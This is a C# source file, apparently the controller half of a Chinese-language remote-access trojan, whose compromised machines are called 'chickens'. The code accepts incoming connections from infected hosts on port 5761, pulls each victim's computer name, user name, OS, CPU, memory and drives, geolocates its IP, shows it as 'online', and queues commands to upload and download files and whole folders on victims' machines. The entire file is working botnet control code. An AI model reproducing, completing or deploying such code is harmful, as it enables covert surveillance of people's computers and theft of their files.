/******************************************
 * 版权所有jackch
 * QQ:106050555
 * E-mail:jackch88@hotmail.com
 * 个人Blog:http://www.jackch.cn
 * CSDN_Blog:http://blog.csdn.net/jackch88/
 * ****************************************/
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.Win32;
using System.Media;
using System.Collections;
using Jackch;

namespace Jackch
{
    public partial class MainForm
    {
        private TcpListener listener = null;
        private IPAddress ip = null;
        private IPHostEntry host = new IPHostEntry();
        private IPEndPoint myServer = null;
        private string hostname = Dns.GetHostName();
        private int port = 5761;

        private RichTextBox richTextBox = new RichTextBox();
        private string command = null;
        private Thread thread = null;
        private Thread threadConnected = null;
        private Thread threadTrans = null;//文件传输线程
        private Chickens chickensTrans = new Chickens();
        private Chickens chickens = new Chickens();

        private FileStream fileStream;
        private DirectoryInfo dir;
        private Socket newSocket;
        private TcpListener newListener = null;

        private IPScaner ipScaner = null;

        private bool InitSocket()
        {
            try
            {
                host = Dns.GetHostByName(hostname);
                ip = host.AddressList[0];
                myServer = new IPEndPoint(ip, port);
                listener = new TcpListener(ip, port);
                listener.Start();
                thread = new Thread(new ThreadStart(target));
                thread.Start();
                threadConnected = new Thread(new ThreadStart(targetConnected));
                threadConnected.Start();
                threadTrans = new Thread(new ThreadStart(targetTrans));
                threadTrans.Start();
            }
            catch (Exception)
            {
                return false;
            }
            return true;

        }
        /// <summary>
        /// 更新上线主机
        /// </summary>
        /// <param name="Parent"></param>
        /// <param name="Child"></param>
        private delegate void Updater(TreeNode Parent, TreeNode Child);
        public void UpdaterTreeView(TreeNode Parent, TreeNode Child)
        {
            Parent.Nodes.Clear();
        }
        public void AddTreeView(TreeNode Parent, TreeNode Child)
        {
            Parent.Nodes.Add(Child);
        }
        public void DelTreeView(TreeNode Parent, TreeNode Child)
        {
            Parent.Nodes.Remove(Child);
        }
        /// <summary>
        /// 更新状态栏
        /// </summary>
        /// <param name="sbp"></param>
        /// <param name="n"></param>
        private delegate void Updater2(StatusBarPanel sbp,string s);
        public void UpdaterStatusBar(StatusBarPanel sbp, string s)
        {
            sbp.Text = s; 
        }
        /// <summary>
        /// 更新命令广播
        /// </summary>
        /// <param name="lv"></param>
        /// <param name="l"></param>
        private delegate void Updater3(ListView lv,ListViewItem l);
        public void UpdaterListViewItem(ListView lv,ListViewItem l)
        {
            lv.Items.Clear();
        }
        public void AddListViewItem(ListView lv, ListViewItem l)
        {
            lv.Items.Add(l);
        }
        public void DelListViewItem(ListView lv, ListViewItem l)
        {
            lv.Items.Remove(l);
        }
        private delegate void Updater4(ListView lv, int l);
        public void DelListViewItem(ListView lv, int l)
        {
            lv.Items.RemoveAt(l);
        }
        private delegate void dInsertListViewItem(ListView lv, int i, ListViewItem l);
        public void InsertListViewItem(ListView lv, int i, ListViewItem l)
        {
            lv.Items.Insert(i, l);
        }
        private void target()
        {
            while (true)
            {               
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket = listener.AcceptSocket();
                if (socket.Connected)
                {
                    IPAddress ConnectIP = ((IPEndPoint)socket.RemoteEndPoint).Address;
                    Chicken chicken = new Chicken(socket, ConnectIP);
                    try
                    {
                        SoundPlayer sp = new SoundPlayer(@"Sound\loginon.wav");
                        sp.Play();
                    }
                    catch { }
                    //获取IP地址
                    ipScaner = new IPScaner();
                    ipScaner.DataPath = @"IP.Dat";
                    ipScaner.IP = ConnectIP.ToString();
                    if (!File.Exists(@"IP.Dat"))
                        MessageBox.Show("目录下的IP.Dat文件不存在","提示");
                    else
                        chicken.Address = ipScaner.IPLocation();
                    string err = ipScaner.ErrMsg;

                    chicken.WriteToServer("PcInfo");
                    bool isConnected = true;
                    string str = chicken.ReadFromServer(out isConnected);
                    string[] info = str.Split('\n');
                    chicken.ComputerName = info[0];
                    chicken.Screens = info[1];
                    chicken.Cpu = info[2]; 
                    chicken.Memory = info[3]; 
                    chicken.Drive = info[4];
                    chicken.OSName = info[5];
                    chicken.UserName = info[6];
                    chicken.Paths = info[7];
                    
                    //填加主机
                    chickens.AddChicken(chicken);
                    //主机上线
                    try
                    {
                        treeView1.Invoke(new Updater(AddTreeView), new object[] { treeView1.Nodes[1], new TreeNode(ConnectIP.ToString()) });
                        statusBar1.Invoke(new Updater2(UpdaterStatusBar), new object[] { statusBarPanel3, "上线主机：" + chickens.Count.ToString() + "台" });
                        ListViewItem lv = new ListViewItem();
                        lv.Text = chicken.IP.ToString();
                        ListViewItem.ListViewSubItem s1 = new ListViewItem.ListViewSubItem();
                        s1.Text = chicken.Address;
                        ListViewItem.ListViewSubItem s2 = new ListViewItem.ListViewSubItem();
                        s2.Text = chicken.ComputerName;
                        ListViewItem.ListViewSubItem s3 = new ListViewItem.ListViewSubItem();
                        s3.Text = chicken.UserName;
                        ListViewItem.ListViewSubItem s4 = new ListViewItem.ListViewSubItem();
                        s4.Text = chicken.OSName;
                        ListViewItem.ListViewSubItem s5 = new ListViewItem.ListViewSubItem();
                        s5.Text = chicken.Cpu;
                        ListViewItem.ListViewSubItem s6 = new ListViewItem.ListViewSubItem();
                        s6.Text = chicken.Memory;
                        ListViewItem.ListViewSubItem s7 = new ListViewItem.ListViewSubItem();
                        s7.Text = chicken.Drive;
                        ListViewItem.ListViewSubItem s8 = new ListViewItem.ListViewSubItem();
                        s8.Text = chicken.Screens;
                        ListViewItem.ListViewSubItem s9 = new ListViewItem.ListViewSubItem();
                        s9.Text = "null";
                        ListViewItem.ListViewSubItem s10 = new ListViewItem.ListViewSubItem();
                        s10.Text = "null";
                        lv.SubItems.AddRange(new ListViewItem.ListViewSubItem[] { s1 ,s2,s3,s4,s5,s6,s7,s8,s9,s10});
                        listView1.Invoke(new Updater3(AddListViewItem), new object[] { listView1, lv});
                    }
                    catch { }
                }
            }

        }
        private void targetConnected()
        {
            while (true)
            {
                for (int i = chickens.Count - 1; i >= 0; --i)
                {
                    if (!chickens[i].Connected())
                    {
                        chickens[i].Close();
                        statusBar1.Invoke(new Updater2(UpdaterStatusBar), new object[] { statusBarPanel2, "主机" + chickens[i].IP.ToString() + "下线"});
                        chickens.DelChicken(chickens[i]);
                        try
                        {
                            treeView1.Invoke(new Updater(DelTreeView), new object[] { treeView1.Nodes[1], treeView1.Nodes[1].Nodes[i] });
                            statusBar1.Invoke(new Updater2(UpdaterStatusBar), new object[] { statusBarPanel3,"上线主机：" + chickens.Count.ToString() + "台"});
                            listView1.Invoke(new Updater4(DelListViewItem), new object[] { listView1, i });
                            SoundPlayer sp = new SoundPlayer(@"Sound\loginout.wav");
                            sp.Play();
                        }
                        catch { }
                    }
                }
                Thread.Sleep(10000);//每10秒判断下线主机
            }
        }
        private void targetTrans()
        {
            while (true)
            {
                for (int i = 0; i < listView9.Items.Count; ++i)
                {
                    try
                    {
                        int imageIndex = (int)(listView9.Invoke(new dGetListViewItemImageIndex(GetListViewItemImageIndex), new object[] { listView9, i }));
                        chickensTrans.CurrentChicken = chickensTrans[i];

                        if (imageIndex == 5)//上传文件
                        {
                            command = "Upload " + (string)(listView9.Invoke(new dListViewSubItems(GetListViewSubItems), new object[] { listView9, i, 4 }));
                            if(!chickensTrans.CurrentChicken.WriteToServer(command))
                                throw new Exception();
                            fileStream = new FileStream((string)(listView9.Invoke(new dListViewSubItems(GetListViewSubItems), new object[] { listView9, i, 3 })), FileMode.Open, FileAccess.Read);
                            Upload();
                            chickensTrans.DelChicken(chickensTrans.CurrentChicken);
                        }
                        else if (imageIndex == 6)//下载文件
                        {
                            command = "Download " + (string)(listView9.Invoke(new dListViewSubItems(GetListViewSubItems), new object[] { listView9, i, 4 }));
                            if (!chickensTrans.CurrentChicken.WriteToServer(command))
                                throw new Exception();
                            fileStream = new FileStream((string)(listView9.Invoke(new dListViewSubItems(GetListViewSubItems), new object[] { listView9, i, 3 })), FileMode.OpenOrCreate, FileAccess.Write);
                            Download();
                            chickensTrans.DelChicken(chickensTrans.CurrentChicken);
                        }
                        else if (imageIndex == 7)//上传文件夹
                        {
                            command = "Updir " + (string)(listView9.Invoke(new dListViewSubItems(GetListViewSubItems), new object[] { listView9, i, 4 }));
                            if (!chickensTrans.CurrentChicken.WriteToServer(command))
                                throw new Exception();
                            Updir();
                            chickensTrans.DelChicken(chickensTrans.CurrentChicken);
                        }
                        else if (imageIndex == 8)//下载文件夹
                        {
                            command = "Downdir " + (string)(listView9.Invoke(new dListViewSubItems(GetListViewSubItems), new object[] { listView9, i, 4 }));
                            if (!chickensTrans.CurrentChicken.WriteToServer(command))
                                throw new Exception();
                            Downdir();
                            chickensTrans.DelChicken(chickensTrans.CurrentChicken);
                        }
                        else//传输失败
                        {
                            
                        }
                    }
                    catch 
                    {
                        chickensTrans.DelChicken(chickensTrans.CurrentChicken);
                        listView9.Invoke(new Updater4(DelListViewItem), new object[] { listView9, i });
                    }
                }
                Thread.Sleep(1000);
            }
        }
        private delegate int dGetListViewItemImageIndex(ListView lv, int l);
        public int GetListViewItemImageIndex(ListView lv, int l)
        {
            return lv.Items[l].ImageIndex;
        }
        private delegate void dSetListViewItemImageIndex(ListView lv, int i, int j);
        public void SetListViewItemImageIndex(ListView lv, int i, int j)
        {
            lv.Items[i].ImageIndex = j;
        }
        private delegate string dListViewSubItems(ListView lv, int i,int j);
        public string GetListViewSubItems(ListView lv, int i, int j)
        {
            return lv.Items[i].SubItems[j].Text;
        }
    }
}